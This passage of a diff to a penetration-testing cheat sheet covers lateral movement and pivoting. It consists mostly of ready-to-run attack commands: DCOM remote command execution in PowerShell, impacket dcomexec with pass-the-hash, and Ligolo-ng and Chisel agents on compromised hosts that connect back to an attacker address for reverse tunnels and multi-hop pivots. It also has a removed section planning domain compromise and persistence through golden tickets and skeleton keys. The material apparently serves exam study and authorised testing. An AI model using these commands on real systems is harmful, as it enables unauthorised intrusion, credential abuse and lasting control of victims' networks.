+$com = [Type]::GetTypeFromProgID("MMC20.Application","<TARGET_IP>")
 $obj = [System.Activator]::CreateInstance($com)
 $obj.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","Minimized")
 
 # ShellWindows DCOM
-$com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","10.11.1.30")
+$com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","<TARGET_IP>")
 $obj = [System.Activator]::CreateInstance($com)
 $item = $obj.Item()
 $item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","","",0)
 
 # ShellBrowserWindow DCOM
-$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","10.11.1.30")
+$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","<TARGET_IP>")
 $obj = [System.Activator]::CreateInstance($com)
 $obj.Document.Application.ShellExecute("cmd.exe","/c calc.exe","","",0)
 ```
@@ -559,14 +546,14 @@ $obj.Document.Application.ShellExecute("cmd.exe","/c calc.exe","","",0)
 
 ```bash
 # DCOM execution
-impacket-dcomexec domain.local/user:Password123@10.11.1.30 "whoami"
-dcomexec.py domain.local/user:Password123@10.11.1.30 "whoami"
+impacket-dcomexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> "whoami"
+dcomexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> "whoami"
 
 # Pass-the-Hash
-impacket-dcomexec domain.local/user@10.11.1.30 -hashes :NTLM_HASH "systeminfo"
+impacket-dcomexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH> "systeminfo"
 
 # Specify DCOM object
-dcomexec.py -object MMC20 domain.local/user:Password123@10.11.1.30
+dcomexec.py -object MMC20 <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
 ```
 
 ---
@@ -686,7 +673,7 @@ ssh -L 8080:localhost:80 -L 3306:localhost:3306 user@10.11.2.10
 ssh -f -N -L 8080:localhost:80 user@10.11.2.10
 ```
 
-### 3.2 Proxychains Pivoting
+### 3.2 Pivoting
 
 **SSH Dynamic Forwarding**
 
@@ -1859,252 +1846,156 @@ Get-ADComputer -Identity target_computer -Properties ms-Mcs-AdmPwd | Select-Obje
 # Can do anything - similar to GenericAll
 ```
 
----
+## 6 Pivoting & Tunneling (Ligolo-ng)
 
-## 6 Progress Tracking and Documentation
+### 6.1 Ligolo-ng Setup
 
-### 6.1 Centralized Movement Dashboard
+**Tool Selection (quick pick):**
 
-**Movement Tracking Database:**
+|Tool|Use Case|Complexity|
+|---|---|---|
+|**Ligolo-ng** ⭐|Full subnet access, multi-hop, VPN-like routing|Medium|
+|**SSH Tunneling**|Single ports or SOCKS when SSH available|Low|
+|**Chisel**|Cross-platform SOCKS/ports, Windows friendly|Medium|
+|**Socat**|Simple TCP relays with minimal footprint|Low|
 
-```markdown
-## 🔄 Lateral Movement Dashboard
+**Download & Prep**
 
-### 🎯 High-Value Targets
-| Target | IP | Access Method | Credentials | Status | Next Steps |
-|--------|----|---------------|-------------|--------|------------|
-| DC01 | 10.11.1.20 | DCSync | krbtgt hash | ✅ Compromised | Golden Ticket |
-| SQL01 | 10.11.1.25 | WinRM | sqlservice | ✅ Compromised | DB credential harvest |
-| FS01 | 10.11.1.30 | SMB PtH | backup_ops | � ️ Limited | Local privilege escalation |
-| EXCH01 | 10.11.1.35 | RDP | admin | ⏳ In Progress | PrivExchange exploitation |
-| WEB01 | 10.11.1.40 | SSH | webadmin | ✅ Compromised | Pivot to internal network |
+```bash
+# On attack machine
+cd /opt && sudo mkdir -p ligolo-ng && sudo chown $USER:$USER ligolo-ng && cd ligolo-ng
 
-### 📊 Access Matrix
-| Host | SMB | WinRM | RDP | SSH | WMI | Notes |
-|------|-----|-------|-----|-----|-----|-------|
-| 10.11.1.5 | ✅ | ✅ | ❌ | ❌ | ✅ | Web server |
-| 10.11.1.15 | ✅ | ❌ | ✅ | ❌ | ✅ | User workstation |
-| 10.11.1.20 | ✅ | ✅ | ✅ | ❌ | ✅ | Domain Controller |
-| 10.11.1.25 | ✅ | ✅ | ❌ | ❌ | ✅ | SQL server |
-| 10.11.2.10 | ❌ | ❌ | ❌ | ✅ | ❌ | Linux file server |
-| 10.11.2.20 | ❌ | ❌ | ❌ | ✅ | ❌ | Linux web app |
+# Grab binaries
+wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_linux_amd64.tar.gz
+wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_linux_amd64.tar.gz
+wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_windows_amd64.zip
 
-### 🔑 Credential Reuse Results
-| Credential | Success Rate | High-Value Systems | Protocol | Notes |
-|------------|-------------|-------------------|----------|-------|
-| domain\sqlservice:Pass123 | 3/3 SQL servers | SQL01, SQL02, SQL03 | SMB, WinRM | Service account |
-| local\admin:Summer2024! | 5/8 workstations | WS01, WS03, WS05, WS07, WS09 | RDP, SMB | Local admin reuse |
-| root:ssh_key | 8/15 Linux hosts | Multiple | SSH | Shared root key |
-| domain\administrator:NTLM | 2/2 servers | FS01, BACKUP01 | SMB PtH | Hash reuse |
-
-### 🌐 Network Segments Accessed
-| Segment | CIDR | Systems | Access Level | Entry Point |
-|---------|------|---------|-------------|-------------|
-| DMZ | 10.11.1.0/24 | 15 hosts | Full control | Initial foothold |
-| Internal | 10.11.2.0/24 | 30 hosts | Partial | Pivot from WEB01 |
-| Management | 10.11.3.0/24 | 5 hosts | Limited | Jump server |
-| Database VLAN | 10.11.4.0/24 | 3 hosts | Recon only | Network scanning |
-
-### 📋 Session Inventory
-| Username | Domain Role | Active Sessions | Last Seen | Target Priority |
-|----------|------------|----------------|-----------|-----------------|
-| administrator | Domain Admin | DC01, EXCH01 | 2024-01-15 10:00 | 🔴 Critical |
-| sqlservice | Service Account | SQL01, SQL02, SQL03 | 2024-01-15 09:30 | �  High |
-| backup_ops | Backup Operators | FS01, BACKUP01 | 2024-01-15 08:00 | 🟡 Medium |
-| webadmin | Local Admin (web) | WEB01, WEB02 | 2024-01-15 11:00 | 🟢 Low |
+tar xzf ligolo-ng_proxy_linux_amd64.tar.gz
+tar xzf ligolo-ng_agent_linux_amd64.tar.gz
+unzip ligolo-ng_agent_windows_amd64.zip
+chmod +x proxy agent
 ```
 
-**Compromise Timeline**
+**One-Time TUN Setup**
 
-```markdown
-## ⏱️ Compromise Timeline
-
-| Time | Event | System | Method | Outcome |
-|------|-------|--------|--------|---------|
-| 08:00 | Initial access | WEB01 (10.11.1.40) | RCE exploit | Shell as www-data |
-| 08:15 | Privilege escalation | WEB01 | Kernel exploit | Root access |
-| 08:30 | Credential harvest | WEB01 | SSH keys, history | Found 3 SSH keys |
-| 08:45 | Lateral movement | WS05 (10.11.1.15) | SSH key reuse | User access |
-| 09:00 | Privilege escalation | WS05 | Stored credentials | Local admin |
-| 09:15 | LSASS dump | WS05 | ProcDump | 5 NTLM hashes |
-| 09:30 | Lateral movement | SQL01 (10.11.1.25) | Pass-the-Hash | sqlservice access |
-| 10:00 | Session hijacking | DC01 (10.11.1.20) | Admin session found | Domain admin token |
-| 10:15 | Domain compromise | DC01 | DCSync | krbtgt hash acquired |
-| 10:30 | Golden ticket | All systems | Forged TGT | Full domain control |
+```bash
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
 ```
 
-### 6.2 Next Target Prioritization
+### 6.2 Ligolo-ng Basic Flow
 
-**Target Priority Matrix:**
+```bash
+# Terminal 1 (attack): start proxy
+cd /opt/ligolo-ng
+sudo ./proxy -laddr 0.0.0.0:11601 -selfcert
 
-```markdown
-## 🎯 Target Prioritization Framework
+# Compromised host: deploy agent
+chmod +x agent
+./agent -connect <ATTACKER_IP>:11601 -ignore-cert
+nohup ./agent -connect <ATTACKER_IP>:11601 -ignore-cert &>/dev/null &   # background
 
-### 🥇 Tier 1: Immediate Value (Priority 1-3)
-**Characteristics:**
-- Domain Controllers
-- Certificate Authorities (AD CS)
-- Credential management systems (CyberArk, password vaults)
-- Backup servers with domain backup
-
-**Rationale:** Direct path to domain compromise or credential access
-
-**Example Targets:**
-1. DC01.domain.local - Domain Controller
-2. CA01.domain.local - Certificate Authority
-3. VAULT01.domain.local - CyberArk server
-
-### 🥈 Tier 2: High Value (Priority 4-7)
-**Characteristics:**
-- Database servers (MSSQL, MySQL, PostgreSQL)
-- File servers with sensitive data
-- Exchange/Email servers
-- Application servers with business logic
-- SCCM/WSUS servers
-
-**Rationale:** Data access, additional credentials, infrastructure control
-
-**Example Targets:**
-4. SQL01.domain.local - Production database
-5. EXCH01.domain.local - Exchange server
-6. FS01.domain.local - Primary file server
-7. SCCM01.domain.local - Systems management
-
-### 🥉 Tier 3: Medium Value (Priority 8-12)
-**Characteristics:**
-- Management/Jump servers
-- Monitoring systems (SIEM, logging)
-- Development servers
-- Web application servers
-- Virtualization management (vCenter)
-
-**Rationale:** Pivot points, monitoring evasion, additional attack surface
-
-**Example Targets:**
-8. JUMP01.domain.local - Administrative jump server
-9. VCENTER01.domain.local - VMware management
-10. DEV01.domain.local - Development server
-11. SPLUNK01.domain.local - SIEM server
-12. APP01.domain.local - Business application
-
-### 📋 Tier 4: Low Value (Priority 13+)
-**Characteristics:**
-- Standard user workstations
-- Print servers
-- Guest networks
-- IoT devices
-- Non-domain systems
-
-**Rationale:** Limited strategic value, used for breadth or specific scenarios
-
-**Example Targets:**
-13. WS-USER01 through WS-USER50 - Workstations
-14. PRINT01 - Print server
-15. GUEST-AP01 - Guest wireless
+# Windows agent
+.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
+Start-Process -NoNewWindow -FilePath ".\\agent.exe" -ArgumentList "-connect <ATTACKER_IP>:11601 -ignore-cert"
 ```
 
-**Decision Factors Framework:**
+**Activate & Route**
 
-```markdown
-## 🤔 Target Selection Decision Matrix
+```bash
+# In proxy console
+ligolo-ng » session            # list sessions
+ligolo-ng » session 0          # select
+[Agent : user@host] » start    # start tunnel
 
-### Network Position (Weight: 25%)
-- **Central Hub (5 pts)**: Has connections to multiple network segments
-- **Gateway (4 pts)**: Bridges different security zones
-- **Endpoint (3 pts)**: Isolated or minimal connections
-- **DMZ (2 pts)**: Externally facing, limited internal access
-- **Isolated (1 pt)**: Air-gapped or heavily restricted
-
-### Access Level (Weight: 30%)
-- **Domain Admin (5 pts)**: Full domain control
-- **Local Admin (4 pts)**: Local system control
-- **Privileged User (3 pts)**: Elevated but limited rights
-- **Standard User (2 pts)**: Normal user access
-- **Guest/Limited (1 pt)**: Minimal permissions
-
-### Data Sensitivity (Weight: 25%)
-- **Critical (5 pts)**: PII, financial, IP, credentials
-- **High (4 pts)**: Business-sensitive data
-- **Medium (3 pts)**: Internal documentation
-- **Low (2 pts)**: General information
-- **Public (1 pt)**: No sensitive data
-
-### Connectivity (Weight: 15%)
-- **Very High (5 pts)**: Connects to 10+ high-value systems
-- **High (4 pts)**: Connects to 5-9 systems
-- **Medium (3 pts)**: Connects to 3-4 systems
-- **Low (2 pts)**: Connects to 1-2 systems
-- **Minimal (1 pt)**: Isolated or single connection
-
-### Time Investment (Weight: 5%)
-- **Quick (5 pts)**: <30 minutes to compromise
-- **Fast (4 pts)**: 30-60 minutes
-- **Moderate (3 pts)**: 1-3 hours
-- **Slow (2 pts)**: 3-8 hours
-- **Extended (1 pt)**: >8 hours
-
-### Example Calculation:
-**Target: SQL01.domain.local**
-- Network Position: Central Hub (5 pts × 0.25 = 1.25)
-- Access Level: Local Admin (4 pts × 0.30 = 1.20)
-- Data Sensitivity: Critical (5 pts × 0.25 = 1.25)
-- Connectivity: High (4 pts × 0.15 = 0.60)
-- Time Investment: Fast (4 pts × 0.05 = 0.20)
-- **Total Score: 4.50 / 5.00** → High Priority Target
+# Terminal 2: add routes to pivoted subnet
+sudo ip route add 10.10.10.0/24 dev ligolo
+ip route | grep ligolo
+ping -c2 10.10.10.5
 ```
 
-**Attack Path Visualization**
+### 6.3 Routing & Port Forwarding
 
-```markdown
-## 🗺️ Attack Path Map
+```bash
+# Create listeners from pivot to deep services
+[Agent : user@host] » listener_add --addr 0.0.0.0:8080 --to 10.10.10.5:80
+[Agent : user@host] » listener_add --addr 0.0.0.0:3390 --to 10.10.10.10:3389
+[Agent : user@host] » listener_add --addr 0.0.0.0:1433 --to 10.10.10.20:1433
+[Agent : user@host] » listener_list
+[Agent : user@host] » listener_stop 0      # remove when done
 
-### Current Position
+# Access forwarded services from attacker
+curl http://localhost:8080/
+xfreerdp /v:localhost:3390 /u:admin /p:password
+impacket-mssqlclient sa:password@localhost:1433
 ```
 
-[Attacker] ↓ [WEB01] ← Initial Foothold (RCE) ↓ (SSH key reuse) [WS05] ← Workstation compromise ↓ (Pass-the-Hash) [SQL01] ← Database server ↓ (Admin session token) [DC01] ← Domain Controller → FULL DOMAIN COMPROMISE
+### 6.4 Multi-Hop Pivoting
 
 ```
-
-### Identified Paths to Critical Targets
-
-**Path 1: Direct Domain Admin**
+Kali → Host A (Agent) → Host B (Agent) → Deep Network
+      10.11.1.5        10.10.10.15       172.16.0.0/24
 ```
 
-[WEB01] → SSH Key → [WS05] → PtH → [SQL01] → Token Impersonation → [DC01] Time: ~2 hours | Success Rate: High | Risk: Medium
+```bash
+# 1) First hop up
+sudo ip route add 10.10.10.0/24 dev ligolo
 
+# 2) Land on Host B through Host A
+nmap -sT -Pn 10.10.10.15
+./agent -connect <ATTACKER_IP>:11601 -ignore-cert   # run on Host B
+
+# 3) Switch to second session in proxy
+ligolo-ng » session 1
+[Agent : user@hostB] » start
+
+# 4) Add deeper route
+sudo ip route add 172.16.0.0/24 dev ligolo
+nmap -sT -Pn 172.16.0.0/24
 ```
 
-**Path 2: File Server to Backup**
+### 6.5 SSH & Chisel Quick Hits
+
+**SSH Tunnels**
+
+```bash
+# Local port forward
+ssh -L 8080:10.10.10.5:80 user@pivot_host
+
+# Dynamic SOCKS proxy (pair with proxychains)
+ssh -D 1080 user@pivot_host
+
+# Remote port forward (reverse from compromised host)
+ssh -R 8080:localhost:80 attacker@<ATTACKER_IP>
 ```
 
-[WEB01] → Cred Reuse → [FS01] → Backup Operator Rights → [BACKUP01] → Backup Domain Admin → [DC01] Time: ~3 hours | Success Rate: Medium | Risk: Low
+**Chisel Reverse SOCKS/Port Forward**
 
+```bash
+# Attacker
+chisel server -p 8000 --reverse
+
+# Target -> reverse SOCKS
+chisel client <ATTACKER_IP>:8000 R:socks
+
+# Target -> reverse port forward
+chisel client <ATTACKER_IP>:8000 R:8080:10.10.10.5:80
 ```
 
-**Path 3: Certificate Authority**
-```
+### 6.6 Quick Reference
 
-[WEB01] → SSH Key → [WS05] → Kerberoasting → [ServiceAccount] → PtH → [CA01] → ESC Exploit → [DC01] Time: ~4 hours | Success Rate: Medium | Risk: High
+```bash
+# Route management
+sudo ip route add 10.10.10.0/24 dev ligolo
+sudo ip route del 10.10.10.0/24 dev ligolo
+ip route | grep ligolo
 
-```
-
-**Path 4: SCCM Compromise**
-```
-
-[WS05] → Local Admin → [SCCM01] → Admin on All Clients → [DC01] Time: ~5 hours | Success Rate: High | Risk: Medium
-
-**Persistence Planning**
-
-```markdown
-## 🔒 Persistence Strategy per System
-
-| System | Primary Method | Backup Method | Detection Risk | Notes |
-|--------|---------------|---------------|----------------|-------|
-| DC01 | Golden Ticket | Skeleton Key | Medium | Rotate every 7 days |
-| SQL01 | Service Account | Scheduled Task | Low | Database trigger option |
-| FS01 | Registry Run Key | WMI Event | Low | File server access maintained |
-| WEB01 | SSH Key | Cron Job | Low | Web shell backup available |
-| WS05 | Startup Folder | Service | Medium | User workstation - check regularly |
+# Common forwards
+listener_add --addr 0.0.0.0:445 --to 10.10.10.5:445    # SMB
+listener_add --addr 0.0.0.0:3389 --to 10.10.10.5:3389  # RDP
+listener_add --addr 0.0.0.0:5985 --to 10.10.10.5:5985  # WinRM
+listener_add --addr 0.0.0.0:1433 --to 10.10.10.20:1433 # MSSQL
+listener_add --addr 0.0.0.0:5432 --to 10.10.10.25:5432 # PostgreSQL
 ```
 
 ---
